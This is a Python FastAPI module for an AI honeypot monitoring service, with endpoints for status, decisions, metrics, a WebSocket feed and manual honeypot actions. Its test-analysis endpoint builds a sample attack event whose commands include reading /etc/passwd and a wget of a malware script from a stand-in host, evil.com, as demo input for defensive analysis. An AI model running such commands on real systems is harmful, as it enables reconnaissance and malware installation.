"""
AI Monitoring API Endpoints.
Real-time AI workflow visualization and control.
"""
import logging
from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse
from typing import List, Optional
from datetime import datetime
import json
import asyncio

from src.ai.monitoring import (
    ai_service,
    AIActivity,
    AIActivityStatus,
    AttackEvent,
    AIDecision,
    ThreatLevel
)
from src.api.v1.endpoints.auth import get_current_user

logger = logging.getLogger(__name__)

router = APIRouter(tags=["AI Monitoring"])


@router.get("/status")
async def get_ai_status(current_user = Depends(get_current_user)):
    """Get current AI monitoring status."""
    return ai_service.get_status()


@router.get("/activities")
async def get_activities(
    limit: int = 20,
    current_user = Depends(get_current_user)
):
    """Get recent AI activities from database."""
    from src.core.db.session import get_db_context
    from src.core.db.models import AIActivityDB
    from sqlalchemy import select
    
    try:
        async with get_db_context() as session:
            result = await session.execute(
                select(AIActivityDB)
                .order_by(AIActivityDB.created_at.desc())
                .limit(limit)
            )
            activities = result.scalars().all()
            data = [{
                "id": a.id,
                "timestamp": a.created_at.isoformat() if a.created_at else None,
                "status": a.status,
                "action": a.action,
                "details": a.details or {},
                "duration_ms": a.duration_ms or 0,
                "success": a.success or False,
            } for a in activities]
            return {"activities": data, "total": len(data)}
    except Exception as e:
        logger.warning(f"Failed to load activities from DB: {e}, using in-memory")
        return {
            "activities": ai_service.get_recent_activities(limit),
            "total": len(ai_service.activities)
        }


@router.get("/decisions")
async def get_decisions(
    limit: int = 10,
    current_user = Depends(get_current_user)
):
    """Get recent AI decisions from database."""
    from src.core.db.session import get_db_context
    from src.core.db.repositories import AIDecisionRepository
    
    try:
        async with get_db_context() as session:
            repo = AIDecisionRepository(session)
            decisions = await repo.get_recent_decisions(limit=limit)
            data = [{
                "id": d.id,
                "timestamp": d.created_at.isoformat() if d.created_at else None,
                "source_ip": d.source_ip,
                "threat_level": d.threat_level,
                "threat_score": d.threat_score,
                "reasoning": d.reasoning,
                "action": d.action,
                "confidence": d.confidence,
                "mitre_attack_ids": d.mitre_attack_ids or [],
            } for d in decisions]
            return {"decisions": data, "total": len(data)}
    except Exception as e:
        logger.warning(f"Failed to load decisions from DB: {e}, using in-memory")
        return {
            "decisions": ai_service.get_recent_decisions(limit),
            "total": len(ai_service.decisions)
        }


@router.post("/start")
async def start_ai_service(current_user = Depends(get_current_user)):
    """Start the AI monitoring service."""
    if not ai_service.is_running:
        await ai_service.start()
    return {"status": "started", "is_running": ai_service.is_running}


@router.post("/stop")
async def stop_ai_service(current_user = Depends(get_current_user)):
    """Stop the AI monitoring service."""
    if ai_service.is_running:
        await ai_service.stop()
    return {"status": "stopped", "is_running": ai_service.is_running}


@router.post("/analyze")
async def trigger_analysis(
    event: dict,
    current_user = Depends(get_current_user)
):
    """Manually trigger analysis of an event."""
    attack_event = AttackEvent(
        id=event.get("id", f"evt-{datetime.utcnow().timestamp()}"),
        source_ip=event.get("source_ip", "unknown"),
        honeypot_id=event.get("honeypot_id", "default"),
        attack_type=event.get("attack_type", "unknown"),
        timestamp=datetime.fromisoformat(event.get("timestamp", datetime.utcnow().isoformat())),
        severity=event.get("severity", "low"),
        raw_log=event.get("raw_log", ""),
        commands=event.get("commands", []),
        credentials_tried=event.get("credentials_tried", [])
    )
    
    ai_service.add_event(attack_event)
    return {"status": "queued", "event_id": attack_event.id}


@router.post("/test-analysis")
async def test_analysis_with_streaming(current_user = Depends(get_current_user)):
    """Trigger a test analysis with LLM thought streaming for demo purposes."""
    # Ensure AI service is running
    if not ai_service.is_running:
        await ai_service.start()
    
    # Discover actual honeypot containers
    honeypot_id = "ssh-honeypot-01"  # Default fallback
    try:
        import docker
        client = docker.from_env()
        containers = client.containers.list(filters={"label": "honeypot.id"})
        if containers:
            # Use the first available honeypot
            honeypot_id = containers[0].labels.get("honeypot.id", honeypot_id)
            logger.info(f"Using honeypot: {honeypot_id}")
    except Exception as e:
        logger.warning(f"Could not discover honeypots: {e}")
    
    # Create a sample attack event
    attack_event = AttackEvent(
        id=f"test-{datetime.utcnow().timestamp()}",
        source_ip="192.168.1.100",
        honeypot_id=honeypot_id,  # Use actual honeypot ID
        attack_type="ssh_brute_force",
        timestamp=datetime.utcnow(),
        severity="high",
        raw_log="SSH session established, commands executed: whoami, cat /etc/passwd",
        commands=["whoami", "cat /etc/passwd", "wget http://evil.com/malware.sh"],
        credentials_tried=[{"username": "admin", "password": "admin123"}]
    )
    
    # Process directly in background to ensure streaming works
    asyncio.create_task(ai_service._analyze_event(attack_event))
    
    return {
        "status": "processing", 
        "event_id": attack_event.id,
        "honeypot_id": honeypot_id,
        "message": "Test analysis triggered. Watch the AI Monitor page for LLM thought streaming and decision execution."
    }


@router.websocket("/ws")
async def ai_monitoring_websocket(websocket: WebSocket):
    """WebSocket for real-time AI activity updates."""
    await websocket.accept()
    
    async def send_activity(activity: AIActivity):
        """Send activity update to WebSocket client."""
        try:
            await websocket.send_json({
                "type": "activity",
                "data": {
                    "id": activity.id,
                    "timestamp": activity.timestamp.isoformat(),
                    "status": activity.status.value,
                    "action": activity.action,
                    "details": activity.details,
                    "duration_ms": activity.duration_ms,
                    "success": activity.success
                }
            })
        except Exception as e:
            logger.warning(f"Failed to send activity via WebSocket: {e}")
    
    async def send_decision(decision: AIDecision):
        """Send decision update to WebSocket client."""
        try:
            await websocket.send_json({
                "type": "decision",
                "data": {
                    "id": decision.id,
                    "timestamp": decision.timestamp.isoformat(),
                    "source_ip": decision.source_ip,
                    "threat_level": decision.threat_level.value,
                    "threat_score": decision.threat_score,
                    "reasoning": decision.reasoning,
                    "action": decision.action,
                    "confidence": decision.confidence,
                    "mitre_attack_ids": decision.mitre_attack_ids,
                }
            })
            logger.debug(f"Sent decision {decision.id} to AI WebSocket client")
        except Exception as e:
            logger.warning(f"Failed to send decision via WebSocket: {e}")
    
    # Subscribe to activity updates
    ai_service.subscribe(send_activity)
    
    # Subscribe to decision updates
    if hasattr(ai_service, 'decision_subscribers'):
        ai_service.decision_subscribers.append(send_decision)
    else:
        logger.warning("AI service does not have decision_subscribers list")
    
    # Also register with the main WebSocket manager for AI channel broadcasts
    from src.api.v1.endpoints.websocket import manager as ws_manager
    from src.api.v1.endpoints.websocket import ConnectionManager
    
    # Subscribe this connection to the "ai" channel
    ws_manager.subscribe(websocket, ["ai"])
    
    try:
        # Send initial status
        await websocket.send_json({
            "type": "status",
            "data": ai_service.get_status()
        })
        
        # Send recent activities
        await websocket.send_json({
            "type": "activities",
            "data": ai_service.get_recent_activities(10)
        })
        
        # Send recent decisions
        await websocket.send_json({
            "type": "decisions",
            "data": ai_service.get_recent_decisions(10)
        })
        
        # Keep connection alive
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_json({"type": "pong"})
            elif data == "status":
                await websocket.send_json({
                    "type": "status",
                    "data": ai_service.get_status()
                })
            elif data == "decisions":
                await websocket.send_json({
                    "type": "decisions",
                    "data": ai_service.get_recent_decisions(10)
                })
                
    except WebSocketDisconnect:
        logger.debug("AI WebSocket client disconnected")
    except Exception as e:
        logger.error(f"AI WebSocket error: {e}")
    finally:
        # Unsubscribe from activity updates
        if send_activity in ai_service.subscribers:
            ai_service.subscribers.remove(send_activity)
        # Unsubscribe from decision updates
        if hasattr(ai_service, 'decision_subscribers') and send_decision in ai_service.decision_subscribers:
            ai_service.decision_subscribers.remove(send_decision)


@router.get("/metrics")
async def get_ai_metrics(current_user = Depends(get_current_user)):
    """Get AI performance metrics from database."""
    from src.core.db.session import get_db_context
    from src.core.db.models import AIActivityDB, AIDecisionDB
    from sqlalchemy import select, func
    
    try:
        async with get_db_context() as session:
            # Get activity metrics from database
            total_result = await session.execute(
                select(func.count()).select_from(AIActivityDB)
            )
            total_activities = total_result.scalar() or 0
            
            successful_result = await session.execute(
                select(func.count()).select_from(AIActivityDB)
                .where(AIActivityDB.success == True)
            )
            successful = successful_result.scalar() or 0
            
            failed_result = await session.execute(
                select(func.count()).select_from(AIActivityDB)
                .where(AIActivityDB.success == False)
            )
            failed = failed_result.scalar() or 0
            
            # Status distribution
            status_result = await session.execute(
                select(AIActivityDB.status, func.count())
                .group_by(AIActivityDB.status)
            )
            status_counts = dict(status_result.all())
            
            # Decision metrics
            decision_count_result = await session.execute(
                select(func.count()).select_from(AIDecisionDB)
            )
            total_decisions = decision_count_result.scalar() or 0
            
            # Action distribution
            action_result = await session.execute(
                select(AIDecisionDB.action, func.count())
                .group_by(AIDecisionDB.action)
            )
            action_counts = dict(action_result.all())
            
            # Average threat score - only from decisions table
            avg_result = await session.execute(
                select(func.avg(AIDecisionDB.threat_score))
            )
            avg_threat = avg_result.scalar() or 0
            
            # Calculate success rate based on completed activities (success or failed)
            completed_activities = successful + failed
            success_rate = successful / completed_activities if completed_activities > 0 else 0
            
            return {
                "total_activities": total_activities,
                "successful_activities": successful,
                "failed_activities": failed,
                "success_rate": round(success_rate, 3),
                "status_distribution": status_counts,
                "total_decisions": total_decisions,
                "action_distribution": action_counts,
                "average_threat_score": round(float(avg_threat), 3) if total_decisions > 0 else 0,
                "pending_events": len(ai_service.pending_events),
                "active_sessions": len(ai_service.active_sessions)
            }
    except Exception as e:
        logger.warning(f"Failed to load metrics from DB: {e}, using in-memory")
        # Fall back to in-memory
        activities = list(ai_service.activities)
        decisions = list(ai_service.decisions)
        
        total_activities = len(activities)
        successful = sum(1 for a in activities if a.success)
        failed = total_activities - successful
        
        status_counts = {}
        for activity in activities:
            status = activity.status.value
            status_counts[status] = status_counts.get(status, 0) + 1
        
        action_counts = {}
        for decision in decisions:
            action = decision.action
            action_counts[action] = action_counts.get(action, 0) + 1
        
        avg_threat = 0
        if decisions:
            avg_threat = sum(d.threat_score for d in decisions) / len(decisions)
        
        return {
            "total_activities": total_activities,
            "successful_activities": successful,
            "failed_activities": failed,
            "success_rate": successful / total_activities if total_activities > 0 else 0,
            "status_distribution": status_counts,
            "total_decisions": len(decisions),
            "action_distribution": action_counts,
            "average_threat_score": round(avg_threat, 3),
            "pending_events": len(ai_service.pending_events),
            "active_sessions": len(ai_service.active_sessions)
        }


@router.get("/health")
async def ai_health_check():
    """Health check for AI service."""
    api_key = ai_service.llm_client.api_key
    placeholder_keys = ["sk-your-api-key-here", "sk-local", "sk-placeholder", "sk-test", "local"]
    api_key_valid = (
        api_key and 
        api_key.startswith("sk-") and 
        api_key not in placeholder_keys
    )
    
    return {
        "status": "healthy" if ai_service.is_running else "stopped",
        "llm_available": await ai_service.llm_client.health_check(),
        "api_key_configured": api_key_valid,
        "api_key_prefix": api_key[:10] + "..." if api_key else "not set",
    }


# ==================== Execution Tracking ====================

@router.get("/executions")
async def get_executions(
    limit: int = 20,
    current_user = Depends(get_current_user)
):
    """Get recent decision execution history."""
    from src.ai.decision_executor import get_executor
    executor = get_executor()
    if executor is None or executor.client is None:
        return {
            "executions": [],
            "stats": {
                "total": 0,
                "success": 0,
                "failed": 0,
                "success_rate": 0,
                "actions": {}
            }
        }
    return {
        "executions": executor.get_execution_history(limit),
        "stats": executor.get_stats()
    }


@router.get("/executions/stats")
async def get_execution_stats(current_user = Depends(get_current_user)):
    """Get execution statistics."""
    from src.ai.decision_executor import get_executor
    executor = get_executor()
    if executor is None or executor.client is None:
        return {
            "total": 0,
            "success": 0,
            "failed": 0,
            "success_rate": 0,
            "actions": {}
        }
    return executor.get_stats()


@router.get("/executions/{execution_id}")
async def get_execution(
    execution_id: str,
    current_user = Depends(get_current_user)
):
    """Get details of a specific execution."""
    from src.ai.decision_executor import get_executor
    executor = get_executor()
    if executor is None or executor.client is None:
        raise HTTPException(status_code=503, detail="Docker unavailable")
    history = executor.get_execution_history(100)
    for execution in history:
        if execution["id"] == execution_id:
            return execution
    raise HTTPException(status_code=404, detail="Execution not found")


@router.post("/manual-action")
async def trigger_manual_action(
    action: dict,
    current_user = Depends(get_current_user)
):
    """Manually trigger a decision action on a honeypot."""
    from src.ai.decision_executor import get_executor
    executor = get_executor()
    if executor is None or executor.client is None:
        raise HTTPException(status_code=503, detail="Docker unavailable — cannot execute actions")

    action_type = action.get("action")
    honeypot_id = action.get("honeypot_id")
    source_ip = action.get("source_ip", "manual")
    config_changes = action.get("config_changes", {})

    if action_type not in ["monitor", "reconfigure", "isolate", "switch_container"]:
        raise HTTPException(status_code=400, detail="Invalid action type")

    if not honeypot_id:
        raise HTTPException(status_code=400, detail="honeypot_id required")

    result = await executor.execute(
        decision_id=f"manual-{int(datetime.utcnow().timestamp() * 1000)}",
        action=action_type,
        source_ip=source_ip,
        honeypot_id=honeypot_id,
        configuration_changes=config_changes,
        threat_level="medium",
    )

    return {
        "execution_id": result.id,
        "status": result.status.value,
        "error": result.error,
        "details": result.details
    }